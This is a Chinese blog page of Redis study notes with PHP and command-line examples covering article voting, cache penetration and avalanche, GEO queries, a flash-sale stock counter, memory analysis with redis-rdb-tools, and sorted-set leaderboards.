class="comment"> * Redis In Action</span></span><br><span class="line"><span class="comment"> * 文章投票功能</span></span><br><span class="line"><span class="comment"> * 前提条件：</span></span><br><span class="line"><span class="comment"> * 文章发表时，记录作者、发表时间、链接、标题、初始投票数</span></span><br><span class="line"><span class="comment"> * 每获得一个投票，文章获得432分（86400/200）</span></span><br><span class="line"><span class="comment"> * 数据结构：</span></span><br><span class="line"><span class="comment"> * 文章hash -- 每篇文章key的形式如：article:92617</span></span><br><span class="line"><span class="comment"> * 文章发表时间zset集合（time:），按时间排序 -- 每条记录的形式如：article:92617（member）  1332065417（score）</span></span><br><span class="line"><span class="comment"> * 文章得分zset集合(score:)，按分数排序</span></span><br><span class="line"><span class="comment"> * 用户对文章的投票set集合(vote:xxxx) -- key形式如：vote:100408，item形式如：user:233487</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> ONE_WEEK_IN_SECONDS = <span class="number">7</span> * <span class="number">86400</span>;</span><br><span class="line"><span class="keyword">const</span> VOTE_SCORE = <span class="number">432</span>;</span><br><span class="line"><span class="keyword">const</span> ARTICLES_PER_PAGE = <span class="number">25</span>;</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="string">'6379'</span>) || exit(<span class="string">'连接失败！'</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文章投票</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $user</span></span><br><span class="line"><span class="comment"> * @param $article</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">articleVote</span>(<span class="params">$redis, $user, $article</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $cutoff = time() - ONE_WEEK_IN_SECONDS;</span><br><span class="line">    <span class="comment">//对发表时间超过一周的文章投票不生效</span></span><br><span class="line">    <span class="comment">//获取 time: 有序集合对应 member 的 score</span></span><br><span class="line">    <span class="keyword">if</span> ($redis-&gt;zScore(<span class="string">'time:'</span>, $article) &lt; $cutoff) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $article_id = explode(<span class="string">':'</span>, $article)[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">//无序集合，添加记录，如果记录存在，返回0（说明用户已对该文章投票），反之则计算分数</span></span><br><span class="line">    <span class="keyword">if</span> ($redis-&gt;sAdd(<span class="string">'voted:'</span> . $article_id, $user)) &#123;</span><br><span class="line">        <span class="comment">// 使用事务操作</span></span><br><span class="line">        <span class="comment">/*$redis-&gt;multi()</span></span><br><span class="line"><span class="comment">            -&gt;zIncrBy('score:' , VOTE_SCORE, $article) //增加文章的分数</span></span><br><span class="line"><span class="comment">            -&gt;hIncrBy($article, 'votes', 1)  //增加文章的投票数</span></span><br><span class="line"><span class="comment">            -&gt;exec();*/</span></span><br><span class="line">        <span class="comment">//使用pipeline型的事务</span></span><br><span class="line">        <span class="comment">//一次性向服务端发送所有命令，减少客户端与服务端之间通讯往返次数</span></span><br><span class="line">        $pipe = $redis-&gt;multi(Redis::PIPELINE);</span><br><span class="line">        $pipe-&gt;zIncrBy(<span class="string">'score:'</span>, VOTE_SCORE, $article);</span><br><span class="line">        $pipe-&gt;hIncrBy($article, <span class="string">'votes'</span>, <span class="number">1</span>);</span><br><span class="line">        $pipe-&gt;exec();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发表文章</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param string $user example: 'user:123456'</span></span><br><span class="line"><span class="comment"> * @param $title</span></span><br><span class="line"><span class="comment"> * @param $link</span></span><br><span class="line"><span class="comment"> * @return integer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">postArticle</span>(<span class="params">$redis, $user, $title, $link</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $article_id = $redis-&gt;incr(<span class="string">'article:'</span>);  <span class="comment">//自增1，不存在key则赋值1</span></span><br><span class="line">    $voted = <span class="string">'voted:'</span> . $article_id;</span><br><span class="line">    $redis-&gt;sAdd($voted, $user);  <span class="comment">//将作者设为已投票用户</span></span><br><span class="line">    $redis-&gt;expire($voted, ONE_WEEK_IN_SECONDS);  <span class="comment">//文章投票信息设置为一周后自动失效</span></span><br><span class="line">    $now = time();</span><br><span class="line">    <span class="comment">//添加文章</span></span><br><span class="line">    $article = <span class="string">'article:'</span> . $article_id;  <span class="comment">//作为文章hash的key值</span></span><br><span class="line">    $redis-&gt;hMSet($article, [  <span class="comment">//批量设置hash键值对</span></span><br><span class="line">        <span class="string">'title'</span> =&gt; $title,</span><br><span class="line">		<span class="string">'link'</span> =&gt; $link,</span><br><span class="line">		<span class="string">'poster'</span> =&gt; $user,</span><br><span class="line">		<span class="string">'time'</span> =&gt; $now,</span><br><span class="line">		<span class="string">'votes'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    ]);</span><br><span class="line">    <span class="comment">//注意zadd第二个参数为score，第三个为member</span></span><br><span class="line">    $redis-&gt;zAdd(<span class="string">'score:'</span>, $now + VOTE_SCORE, $article);  <span class="comment">//设置文章初始分数</span></span><br><span class="line">    $redis-&gt;zAdd(<span class="string">'time:'</span>,  $now, $article);  <span class="comment">//记录文章发表时间</span></span><br><span class="line">    <span class="keyword">return</span> $article_id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取文章列表</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $page</span></span><br><span class="line"><span class="comment"> * @param string $order  用来排序的有序集合</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArticles</span>(<span class="params">$redis, $page, $order = <span class="string">'score:'</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = ($page - <span class="number">1</span>) * ARTICLES_PER_PAGE;</span><br><span class="line">	$end = $start + ARTICLES_PER_PAGE - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//获取指定范围内的member值（文章ID，article:123456），按$order分数递减排序</span></span><br><span class="line">    $ids = $redis-&gt;zRevRange($order, $start, $end);</span><br><span class="line">    $pipe = $redis-&gt;multi(Redis::PIPELINE);</span><br><span class="line">    foreach ($ids <span class="keyword">as</span> $id) &#123;</span><br><span class="line">        $pipe-&gt;hGetAll($id);</span><br><span class="line">        <span class="comment">//不使用pipeline的时候</span></span><br><span class="line">        <span class="comment">/*$article_data = $redis-&gt;hGetAll($id);</span></span><br><span class="line"><span class="comment">        $article_data['id'] = $id;</span></span><br><span class="line"><span class="comment">        $articles[] = $article_data;*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    $articles = $pipe-&gt;exec();</span><br><span class="line">    <span class="comment">//把文章ID加回去</span></span><br><span class="line">    foreach ($articles <span class="keyword">as</span> $k =&gt; $article) &#123;</span><br><span class="line">        $articles[$k][<span class="string">'id'</span>] = $ids[$k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $articles;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 添加/移除文章分类</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $article_id</span></span><br><span class="line"><span class="comment"> * @param array $to_add</span></span><br><span class="line"><span class="comment"> * @param array $to_remove</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addRemoveGroups</span>(<span class="params">$redis, $article_id, $to_add = [], $to_remove = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $article = <span class="string">'article:'</span> . $article_id;</span><br><span class="line">    foreach ($to_add <span class="keyword">as</span> $group) &#123;</span><br><span class="line">        $redis-&gt;sAdd(<span class="string">'group:'</span> . $group, $article);</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($to_remove <span class="keyword">as</span> $group) &#123;</span><br><span class="line">        $redis-&gt;sRem(<span class="string">'group:'</span> . $group, $article);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取分组下的文章数据</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $group</span></span><br><span class="line"><span class="comment"> * @param $page</span></span><br><span class="line"><span class="comment"> * @param string $order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getGroupArticles</span>(<span class="params">$redis, $group, $page, $order = <span class="string">'score:'</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = $order . $group;</span><br><span class="line">    <span class="keyword">if</span> (!$redis-&gt;exists($key)) &#123;</span><br><span class="line">        <span class="comment">//获得对应分组下，文章-分数的有序集合</span></span><br><span class="line">        $redis-&gt;zInterStore($key, [<span class="string">'group:'</span> . $group, $order], [<span class="number">1</span>, <span class="number">1</span>], <span class="string">'max'</span>);</span><br><span class="line">        $redis-&gt;expire($key, <span class="number">60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getArticles($redis, $page, $key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//发布若干文章</span></span><br><span class="line">postArticle($redis, <span class="string">'user:1'</span>, <span class="string">'测试文章1'</span>, <span class="string">'article-link-1'</span>);</span><br><span class="line">postArticle($redis, <span class="string">'user:2'</span>, <span class="string">'测试文章2'</span>, <span class="string">'article-link-2'</span>);</span><br><span class="line">postArticle($redis, <span class="string">'user:3'</span>, <span class="string">'测试文章3'</span>, <span class="string">'article-link-3'</span>);</span><br><span class="line"><span class="comment">//用户10对文章1进行投票</span></span><br><span class="line">articleVote($redis, <span class="string">'user:10'</span>, <span class="string">'article:1'</span>);</span><br><span class="line">echo <span class="string">"article:1 的投票用户:"</span> . PHP_EOL;</span><br><span class="line">$result = $redis-&gt;sMembers(<span class="string">'voted:1'</span>);</span><br><span class="line">print_r($result);</span><br><span class="line">echo <span class="string">"各文章得分:"</span> . PHP_EOL;</span><br><span class="line">$scores = $redis-&gt;zRange(<span class="string">'score:'</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="string">'withscores'</span>);</span><br><span class="line">print_r($scores);</span><br><span class="line">echo <span class="string">"文章列表:"</span> . PHP_EOL;</span><br><span class="line">$articles = getArticles($redis, <span class="number">1</span>);</span><br><span class="line">print_r($articles);</span><br><span class="line">exit();</span><br><span class="line"><span class="comment">//给文章添加分类</span></span><br><span class="line">addRemoveGroups($redis, <span class="string">'1'</span>, [<span class="string">'php'</span>, <span class="string">'redis'</span>]);</span><br><span class="line">addRemoveGroups($redis, <span class="string">'2'</span>, [<span class="string">'python'</span>, <span class="string">'redis'</span>]);</span><br><span class="line"><span class="comment">//获取‘redis’分组下的文章</span></span><br><span class="line">$redisGroupArticles = getGroupArticles($redis, <span class="string">'redis'</span>, <span class="number">1</span>);</span><br><span class="line">echo <span class="string">"redis分类的文章列表:"</span> . PHP_EOL;</span><br><span class="line">print_r($redisGroupArticles);</span><br><span class="line">https:<span class="comment">//github.com/HubQin/redis-in-action-php/blob/master/article_voting.php</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/29511</span></span><br></pre></td></tr></table></figure>
<h3 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">缓存穿透 ： DB 承受了没有必要的查询流量，意思就是查到空值的时候没有做缓存处理，再次查询的时候继续读库了</span><br><span class="line">缓存击穿：热点 Key，大量并发读请求引起的小雪崩， 就是缓存在某个时间点过期的时候，恰好在这个时间点对这个 Key 有大量的并发请求过来，这些请求发现缓存过期一般都会从后端 DB 加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端 DB 压垮</span><br><span class="line">缓存雪崩：缓存设置同一过期时间，引发的大量的读取数据库操作</span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/fef1c22d63cb</span></span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）缓存穿透</span><br><span class="line"></span><br><span class="line">请求去查询一条压根儿数据库中根本就不存在的数据，也就是缓存和数据库都查询不到这条数据，但是请求每次都会打到数据库上面去。</span><br><span class="line"></span><br><span class="line">解决方案：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 对于返回为 NULL 的依然缓存</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 制定一些规则过滤一些不可能存在的数据</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）缓存击穿</span><br><span class="line"></span><br><span class="line">在平常高并发的系统中，大量的请求同时查询一个 key 时，此时这个 key 正好失效了，就会导致大量的请求都打到数据库上面去。这种现象我们称为缓存击穿。</span><br><span class="line"></span><br><span class="line">解决方案：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 加分布式锁，对于获取到这个锁的线程，查询数据库更新缓存，其他线程采取重试策略</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 采取到期自动刷新的策略，而不是到期自动淘汰</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）缓存雪崩</span><br><span class="line"></span><br><span class="line">当某一时刻发生大规模的缓存失效的情况，比如你的缓存服务宕机了，会有大量的请求进来直接打到 DB 上面。</span><br><span class="line"></span><br><span class="line">解决方案：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 增加缓存系统可用性，通过监控关注缓存的健康程度，根据业务量适当的扩容缓存。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 采用多级缓存，不同级别缓存设置的超时时间不同，及时某个级别缓存都过期，也有其他级别缓存兜底。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 缓存的过期时间可以取个随机值，尽量让不同 Key 的过期时间不同。</span><br><span class="line"></span><br><span class="line">六、缓存更新策略</span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）Cache Aside</span><br><span class="line"></span><br><span class="line">应用查询数据的时候先查询缓存层的数据，如果缓存中没有则到数据库中查询数据，并把数据放入缓存层。</span><br><span class="line"></span><br><span class="line">更新数据的时候先对数据库进行更新，然后通过指令使缓存层的数据失效。</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)Read/Write Through</span><br><span class="line"></span><br><span class="line">应用要读数据和更新数据都直接访问缓存服务</span><br><span class="line"></span><br><span class="line">缓存服务同步的将数据更新到数据库</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)Write Behind</span><br><span class="line"></span><br><span class="line">应用要读数据和更新数据都直接访问缓存服务</span><br><span class="line"></span><br><span class="line">缓存服务异步的将数据更新到数据库（通过异步任务）</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29751</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-的-LBS-尝试地理位置"><a href="#Redis-的-LBS-尝试地理位置" class="headerlink" title="Redis 的 LBS 尝试地理位置"></a>Redis 的 LBS 尝试地理位置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.118007'</span>, <span class="string">'30.259293'</span>, <span class="string">'桃园岭'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.119445'</span>,<span class="string">'30.255082'</span>, <span class="string">'农耕科普园'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.071655'</span>,<span class="string">'30.272893'</span>, <span class="string">'西溪湿地'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.114321'</span>,<span class="string">'30.221218'</span>, <span class="string">'龙井村'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.145012'</span>,<span class="string">'30.205586'</span>, <span class="string">'白塔公园'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.112912'</span>,<span class="string">'30.224221'</span>, <span class="string">'十里琅珰'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.107264'</span>,<span class="string">'30.206997'</span>, <span class="string">'狮峰'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.117936'</span>,<span class="string">'30.227969'</span>, <span class="string">'真迹寺'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.10826'</span>,<span class="string">'30.246569'</span>, <span class="string">'灵隐寺'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.114123'</span>,<span class="string">'30.264152'</span>, <span class="string">'状元峰'</span>);</span><br><span class="line">我们获取西溪湿地和龙井村的距离</span><br><span class="line"></span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEODIST'</span>, <span class="string">'location'</span>,<span class="string">'西溪湿地'</span>, <span class="string">'龙井村'</span>, <span class="string">'m'</span>);</span><br><span class="line">print_r($ret);  <span class="comment">//7060.0083</span></span><br><span class="line">其他命令：</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回灵隐寺,状元峰的位置</span></span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEOPOS'</span>, <span class="string">'location'</span>,<span class="string">'灵隐寺'</span>, <span class="string">'状元峰'</span>);</span><br><span class="line">print_r($ret);</span><br><span class="line"><span class="comment">// 返回'120.114253','30.219759'坐标附近1km的地址</span></span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEORADIUS'</span>, <span class="string">'location'</span>,<span class="string">'120.114253'</span>,<span class="string">'30.219759'</span>, <span class="number">1</span>, <span class="string">'km'</span>, <span class="string">'WITHDIST'</span>);</span><br><span class="line">print_r($ret);</span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEOHASH'</span>, <span class="string">'location'</span>,<span class="string">'龙井村'</span>, <span class="string">'灵隐寺'</span>);</span><br><span class="line">print_r($ret);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35871</span></span><br></pre></td></tr></table></figure>
<h3 id="基于redis的秒杀"><a href="#基于redis的秒杀" class="headerlink" title="基于redis的秒杀"></a>基于redis的秒杀</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例化redis</span></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line"><span class="comment">//连接</span></span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">$key = <span class="string">'sale'</span>;</span><br><span class="line"><span class="comment">//检测是否连接成功</span></span><br><span class="line"><span class="comment">// echo "Server is running: " . $redis-&gt;ping();</span></span><br><span class="line">$redis-&gt;setnx($key, <span class="number">0</span>);</span><br><span class="line">$redis-&gt;watch($key); <span class="comment">//监测一个key的值是否被更改</span></span><br><span class="line"></span><br><span class="line">$sale_num = $redis-&gt;get($key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($sale_num &gt; <span class="number">4</span>) &#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$redis-&gt;multi(); <span class="comment">//标记事务</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$redis-&gt;incr($key);  <span class="comment">//销量+1</span></span><br><span class="line">sleep(<span class="number">1</span>); <span class="comment">//模拟真实环境</span></span><br><span class="line">$ret = $redis-&gt;exec(); <span class="comment">// 事务块内所有命令的返回值，按命令执行的先后顺序排列。</span></span><br><span class="line"><span class="keyword">if</span> ($ret) &#123;</span><br><span class="line">    include <span class="string">'db.php'</span>;</span><br><span class="line">    $db = <span class="keyword">new</span> db([</span><br><span class="line">        <span class="string">'database_type'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">        <span class="string">'database_name'</span> =&gt; <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'server'</span> =&gt; <span class="string">'www.13sai.com&amp;#39;,</span></span><br><span class="line"><span class="string">        '</span>username<span class="string">' =&gt; '</span><span class="number">13</span>sai<span class="string">',</span></span><br><span class="line"><span class="string">        '</span>password<span class="string">' =&gt; '</span>*<span class="string">',</span></span><br><span class="line"><span class="string">        '</span>charset<span class="string">' =&gt; '</span>utf8<span class="string">'</span></span><br><span class="line"><span class="string">    ]);</span></span><br><span class="line"><span class="string">    $db-&gt;update('</span>goods<span class="string">', ["stock_num[-]" =&gt; 1], ['</span>id<span class="string">' =&gt; 1]);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="查看所有-key-的-value-值所占内存大小"><a href="#查看所有-key-的-value-值所占内存大小" class="headerlink" title="查看所有 key 的 value 值所占内存大小"></a>查看所有 key 的 value 值所占内存大小</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ pip install rdbtools python-lzf</span><br><span class="line">$ git clone https:<span class="comment">//github.com/sripathikrishnan/redis-rdb-tools</span></span><br><span class="line">$ cd redis-rdb-tools</span><br><span class="line">$ sudo python setup.py install</span><br><span class="line">$ whereis redis.conf</span><br><span class="line">redis: <span class="regexp">/etc/</span>redis.conf</span><br><span class="line">$ cat /etc/redis.conf | grep dir | grep redis</span><br><span class="line">dir /<span class="keyword">var</span>/lib/redis</span><br><span class="line">$ cat /etc/redis.conf | grep dump.rdb</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line">综上，得知其路径为：/<span class="keyword">var</span>/lib/redis/dump.rdb</span><br><span class="line"></span><br><span class="line">按内存值导出 csv</span><br><span class="line"></span><br><span class="line">$ rdb -c memory /<span class="keyword">var</span>/lib/redis/dump.rdb &gt; <span class="regexp">/tmp/</span>redis.csv</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33211</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-快速上手"><a href="#Redis-快速上手" class="headerlink" title="Redis 快速上手"></a>Redis 快速上手</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Redis 的事务处理的命令</span><br><span class="line"></span><br><span class="line">MULTI：开启一个事务；</span><br><span class="line">EXEC：事务执行，将一次性执行事务内的所有命令；</span><br><span class="line">DISCARD：取消事务；</span><br><span class="line">WATCH：监视一个或多个键，如果事务执行前某个键发生了改动，那么事务也会被打断；</span><br><span class="line">UNWATCH：取消 WATCH 命令对所有键的监视。</span><br><span class="line"></span><br><span class="line">需要说明的是 Redis 实现事务是基于 COMMAND 队列，</span><br><span class="line">如果 Redis 没有开启事务，那么任何的 COMMAND 都会立即执行并返回结果。</span><br><span class="line">如果 Redis 开启了事务，COMMAND 命令会放到队列中，并且返回排队的状态 QUEUED，</span><br><span class="line">只有调用 EXEC，才会执行 COMMAND 队列中的命令。</span><br><span class="line">玩家排行榜案例</span><br><span class="line"></span><br><span class="line">统计全部玩家的排行榜</span><br><span class="line">ZREVRANGE user_score <span class="number">0</span> <span class="number">-1</span> WITHSCORES</span><br><span class="line"></span><br><span class="line">按名次查询排名前 N 名的玩家</span><br><span class="line">统计前 <span class="number">10</span> 名玩家，可以使用：ZREVRANGE user_score <span class="number">0</span> <span class="number">9</span></span><br><span class="line"></span><br><span class="line">查询某个玩家的分数</span><br><span class="line">查询玩家 <span class="number">10001</span> 的分数可以使用：ZSCORE user_score <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">查询某个玩家的排名</span><br><span class="line">查询玩家 <span class="number">10001</span> 的排名可以使用：ZREVRANK user_score <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">对玩家的分数和排名进行更新</span><br><span class="line">对玩家 <span class="number">10001</span> 的分数减 <span class="number">1</span>，可以使用：ZINCRBY user_score <span class="number">-1</span> <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">查询指定玩家前后 M 名的玩家</span><br><span class="line">查询玩家 <span class="number">10001</span> 前后 <span class="number">5</span> 名玩家都是谁，当前已知玩家 <span class="number">10001</span> 的排名是 <span class="number">18036</span>，</span><br><span class="line">那么可以使用：ZREVRANGE user_score <span class="number">18031</span> <span class="number">18041</span></span><br><span class="line"></span><br><span class="line">增加或移除某个玩家，并对排名进行更新</span><br><span class="line">删除玩家 <span class="number">10001</span>，可以使用：ZREM user_score <span class="number">10001</span></span><br><span class="line">查询下排名在 <span class="number">18031</span> 到 <span class="number">18041</span> 的玩家是谁，使用：ZREVRANGE user_score <span class="number">18031</span> <span class="number">18041</span></span><br><span class="line"></span><br><span class="line">把玩家 <span class="number">10001</span> 的信息再增加回来，使用：ZADD user_score <span class="number">93.1504697596</span> <span class="number">10001</span></span><br><span class="line">看下排名在 <span class="number">18031</span> 到 <span class="number">18041</span> 的玩家是谁，使用：ZREVRANGE user_score <span class="number">18031</span> <span class="number">18041</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/37066</span></span><br></pre></td></tr></table></figure>
